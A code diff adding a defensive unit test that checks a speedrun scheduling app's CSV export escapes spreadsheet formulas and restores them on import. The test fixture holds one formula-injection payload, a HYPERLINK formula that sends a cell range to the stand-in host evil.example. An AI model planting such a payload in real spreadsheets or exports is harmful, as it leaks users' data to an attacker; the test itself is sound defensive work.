@@ -133,6 +133,20 @@ describe("csv", () => {
 		expect(draft.report.newGames).toEqual(["Super Mario 64"]);
 	});
 
+	it("escapes spreadsheet formulas in the export and restores them on import", () => {
+		const payload = '=HYPERLINK("https://evil.example/?d="&C2:C500,"Click")';
+		const submissions = [submission({ id: 8, game: payload, specialRequirements: "-needs a desk", runnerUsername: "-dash" })];
+		const csv = submissionsToCsv(event, submissions);
+
+		expect(csv).not.toMatch(/(^|,)"?=HYPERLINK/m);
+		expect(csv).toContain(`'=HYPERLINK`);
+
+		const [row] = parseCsv(csv);
+		expect(row.game).toBe(payload);
+		expect(row.specialRequirements).toBe("-needs a desk");
+		expect(row.runner).toBe("-dash");
+	});
+
 	it("detects buffers and sleep blocks", () => {
 		expect(detectRowType({ game: "Setup Buffer" })).toBe("setupBuffer");
 		expect(detectRowType({ game: "sleep" })).toBe("sleep");
